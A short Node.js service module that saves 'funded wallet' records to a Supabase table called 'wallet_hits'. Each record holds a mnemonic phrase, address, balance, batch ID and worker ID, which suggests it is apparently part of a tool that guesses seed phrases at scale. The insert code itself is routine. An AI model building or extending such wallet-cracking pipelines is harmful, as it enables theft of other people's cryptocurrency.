// backend/services/saveWallet.js

const { createClient } = require("@supabase/supabase-js")
const dotenv = require("dotenv")

// Load environment variables
dotenv.config()

// Initialize Supabase client
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY)

/**
 * Save a funded wallet to the database
 * @param {Object} wallet - Wallet data
 * @param {string} wallet.phrase - Mnemonic phrase
 * @param {string} wallet.walletType - Type of wallet (ethereum, solana)
 * @param {string} wallet.address - Wallet address
 * @param {string} wallet.balance - Wallet balance
 * @param {number} wallet.batchId - Batch ID
 * @param {number} wallet.workerId - Worker ID
 * @returns {Promise<Object>} Result of the operation
 */
async function saveWallet(wallet) {
  try {
    const { data, error } = await supabase.from("wallet_hits").insert([
      {
        phrase: wallet.phrase,
        wallet_type: wallet.walletType,
        address: wallet.address,
        balance: wallet.balance,
        batch_id: wallet.batchId,
        worker_id: wallet.workerId,
        found_at: new Date().toISOString(),
      },
    ])

    if (error) {
      console.error("Error saving wallet:", error)
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    console.error("Error saving wallet:", error)
    return { success: false, error: error.message }
  }
}

// Export functions
module.exports = {
  saveWallet,
}
